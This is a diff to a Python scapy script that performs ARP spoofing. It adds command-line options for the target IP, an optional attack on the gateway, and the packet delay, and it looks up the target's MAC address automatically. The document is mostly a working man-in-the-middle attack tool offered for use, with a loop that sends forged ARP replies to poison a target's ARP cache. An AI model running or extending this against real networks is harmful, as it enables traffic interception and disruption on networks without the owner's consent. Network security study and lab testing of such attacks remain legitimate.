@@ -3,9 +3,10 @@ import sys
 import time
 
 
-target_ip = "10.42.0.116"  # Enter your target IP
-target_mac = "82::10::61::18::72::1c"
+target_ip = "192.168.1.135"  # Enter your target IP
 gateway_ip = "192.168.1.1"  # Enter your gateway's IP
+attack_gw = False
+delay = 2
 
 
 def get_mac(ip):
@@ -17,7 +18,7 @@ def get_mac(ip):
 
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
                        psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
@@ -34,10 +35,11 @@ def main():
         sent_packets_count = 0
         while True:
             spoof(target_ip, gateway_ip)
-            spoof(gateway_ip, target_ip)
-            sent_packets_count = sent_packets_count + 2
+            if attack_gw:
+                spoof(gateway_ip, target_ip)
+            sent_packets_count = sent_packets_count + 1
             print("\r[*] Packets Sent " + str(sent_packets_count), end="")
-            time.sleep(2)  # Waits for two seconds
+            time.sleep(delay)  # Waits for two seconds
 
     except KeyboardInterrupt:
         print("\nCtrl + C pressed.............Exiting")
@@ -58,5 +60,21 @@ if __name__ == "__main__":
             print(" -gw                            should GW be attacked as well")
             print(" -t TARGET, --target TARGET     IP of target")
             exit()
+        if "-gw" in sys.argv:
+            attack_gw = True
+        if "-t" in sys.argv or "--target" in sys.argv:
+            index = -1
+            if "-t" in sys.argv:
+                index = sys.argv.index("-t")
+            else:
+                index = sys.argv.index("--target")
+            target_ip = sys.argv[index + 1]
+        if "-d" in sys.argv or "--delay" in sys.argv:
+            index = -1
+            if "-d" in sys.argv:
+                index = sys.argv.index("-d")
+            else:
+                index = sys.argv.index("--delay")
+            delay = int(sys.argv[index + 1])
 
     main()
